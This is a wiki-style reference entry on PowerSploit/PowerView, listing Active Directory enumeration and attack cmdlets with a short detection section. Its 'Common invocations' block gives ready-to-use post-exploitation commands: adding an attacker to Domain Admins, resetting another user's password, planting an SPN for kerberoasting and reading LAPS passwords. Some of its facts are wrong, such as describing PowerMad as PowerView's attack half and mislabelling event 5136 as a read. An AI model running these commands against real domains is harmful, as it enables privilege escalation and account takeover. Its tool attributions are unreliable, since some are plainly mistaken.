---
title: PowerSploit / PowerView
type: entity
created: 2026-09-06
updated: 2026-09-06
tags: [tool, powershell, active-directory, enumeration, post-exploitation]
---

# PowerSploit / PowerView

**PowerSploit** (Matthew Graeber / Graeber et al.) is the PowerShell AD
attack/enum module suite. **PowerView** is its AD enumeration half
(`Get-Domain*`), and **PowerMad** is its AD attack half (`Add-Domain*`,
`Set-Domain*`). It's the in-band PowerShell equivalent of [[impacket]] — the
default for AD enumeration and ACL/group manipulation from a Windows host.

## PowerView (enumeration)

- `Get-DomainUser`, `Get-DomainGroup`, `Get-DomainComputer`,
  `Get-DomainGPO` — object enumeration (with `-Properties`).
- `Get-DomainObjectAcl` — **the** ACL query for [[acl-abuse]] (filter by
  right: `GenericAll|GenericWrite|WriteDacl|WriteOwner|WriteProperty`).
- `Get-DomainSPNTicket` / SPN enumeration — feeds [[kerberoasting]].
- `Get-DomainComputerLAPSPassword` — read [[laps]] passwords.
- `Get-DomainGPOUserLocalGroupMapping`, `Get-DomainTrust` — GPO / trust
  enumeration ([[gpo-abuse]], [[ad-trust-attacks]]).
- `Get-DomainOU`, `Get-DomainOU -OUPermissions` — OU/ACL mapping.

## PowerMad (attacks)

- `Add-DomainGroupMember` — add a member to a group (e.g. Domain Admins)
  ([[acl-abuse]] GenericAll on a group).
- `Set-DomainUserPassword` — reset a password (GenericAll on a user).
- `Set-DomainObject` — write arbitrary attributes (e.g.
  `servicePrincipalName` for [[kerberoasting]], `msDS-AllowedToActOnBehalfOfOtherIdentity`
  for RBCD, `sidHistory` for [[sid-history]]).
- `Set-DomainComputer` — set `msds-allowedtodelegateto` / RBCD SD
  ([[kerberos-delegation-abuse]]).
- `Add-DomainObjectAcl` — grant an ACE ([[acl-abuse]] WriteDacl).

## Common invocations

```powershell
# ACL enumeration — who can I write, and what rights do I hold
Get-DomainObjectAcl -ResolveGUIDs |
  Where-Object {$_.SecurityIdentifier -eq (ConvertTo-SID "CORP\attacker")}
Get-DomainObjectAcl -Identity target -ResolveGUIDs |
  Where-Object {$_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl|WriteOwner"}

# Group membership (GenericAll on a group)
Add-DomainGroupMember -Identity "Domain Admins" -Members attacker

# Password reset (GenericAll on a user)
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString "P@ss" -AsPlainText -Force)

# Write an attribute (RBCD SPN / sidHistory)
Set-DomainObject -Identity targetuser -Set @{'serviceprincipalname'='fake/x'}

# Read LAPS
Get-DomainComputer targetpc -Properties ms-mcs-admpassword
```

## Detection

- **PowerShell module import** — `Import-Module PowerView` (4104 script block,
  4103 command line) is a tell on a modern host.
- **LDAP read burst** — the `Get-Domain*` enumeration generates heavy LDAP
  traffic (4662/5136-ish reads).
- **5136** — the attribute changes from `Set-Domain*` / `Add-Domain*`.
- **4670** — ACE changes from `Add-DomainObjectAcl`.

## Links

- [[acl-abuse]] — the Get-DomainObjectAcl / Add-DomainObjectAcl pair
- [[kerberoasting]] — SPN enumeration
- [[laps]] — Get-DomainComputerLAPSPassword
- [[kerberos-delegation-abuse]] — Set-DomainComputer for RBCD/constrained
- [[sid-history]] — Set-DomainObject for sidHistory
- [[impacket]] — the cross-platform (Linux) contrast
- [[rubeus]] — the in-session Kerberos complement

## References

- [PowerSploit (Graeber)](https://github.com/PowerSploit/PowerSploit)
- [PowerView / PowerMad documentation](https://powersploit.github.io/powerview/)
- [ired.team: PowerView](https://www.ired.team/)
